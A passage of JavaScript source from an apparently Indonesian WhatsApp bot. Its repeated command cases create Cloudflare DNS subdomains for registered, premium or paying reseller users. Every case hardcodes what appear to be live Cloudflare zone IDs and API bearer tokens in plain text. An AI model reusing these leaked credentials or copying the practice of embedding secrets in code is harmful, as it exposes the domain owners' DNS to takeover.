             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain31': {
    if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ecfab91669cd9f1f269ff910ef37c4bc";
               let apitoken = "OwvvvI_MTLmsl2O5NnlzvPOfJfkNJlU2IAwA3wGH";
               let tld = "biistoreee.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain32': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6e54db622bb8682bdf42316953b5401d";
               let apitoken = "OwvvvI_MTLmsl2O5NnlzvPOfJfkNJlU2IAwA3wGH";
               let tld = "biistoreee.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
	case 'domain33': {
    if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "601cbd78e8141e5ffa37e5bcac5f1e00";
               let apitoken = "TXXi3Cz2NusjfQ4_KStk-mc-IaIKzCj_sINwPLm";
               let tld = "rulzxyxd.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'domain34': case 'domain35': {
     if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isOwner) return m.reply("maaf su fitur ini khusus tuan saya.")
     }
     break
          case 'domain36': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain HardzOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "44379cef53cb4d8b5e28c11d28efff19";
               let apitoken = "9OAjUqNDxN0EohV6BUh3AROVbLjiYwdzcp_0gGU1";
               let tld = "rizalshop.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain37': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain HardzOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e0f9412065e53bd57bde671aa36345a9";
               let apitoken = "MDVzjxiioRJ9uO8UnGuvqIIcahrstb-mjlgECNbw";
               let tld = "panelku.link";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain38': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain Hardz\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "74fc380e8c21521fdb09363ae57b8b92";
               let apitoken = "xGFeJ0uxY6G8xQKnpwDKKFpz_2umbCwddUSsNZEx";
               let tld = "sanzyy.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
            break
          case 'domain39': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0aec98100985db6fa9390b8983c1e9b8";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "home-panel.pw";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain40': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain HardzOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80eccb8365dd03f4cd3408ed221f0a30";
               let apitoken = "NZnnadMJfEmkr2amCyGZ1kb38XKaVJMHZGNVwi0z";
               let tld = "aswinxd.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain41': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "433a5c33932fa9ae50165c9df5e15f0e";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "panel-zall.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain42': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain HardzOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d4a6adffd3dd317753c4401e38cb7949";
               let apitoken = "oMSalNry5ByDu_PBJhTAxNOhQiYKjWQImKKDIhWh";
               let tld = "digital-market.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain43': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain HardzOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e13ba8568f6e44ca927569da961d9eb6";
               let apitoken = "bTF2B2fQNe0nJL62gTuGQEbeZCEbOC0FpGWB-ESr";
               let tld = "Hardzofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain44': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain HardzOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fb96c7c37f24377704b78f5cc41af7a5";
               let apitoken = "XL-sfJZLBRtXDxkZ9ElUuxTLTwi95P-z-Ei14pDt";
               let tld = "tokodigital.software";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain45': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f2fdc89319f657dcc383a21941a47352";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "agen-panell.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By HardzOffcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain46': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isOwner) return reply('Maaf, domain ini hanya untuk pemilik.')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "eb040b2fa1975c2daf0df485c9b27f72";
               let apitoken = "0SQK6u0tkUJjSX9NU53x8W5RdN6oi5HI02OsLO6L";
               let tld = "privateyour.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
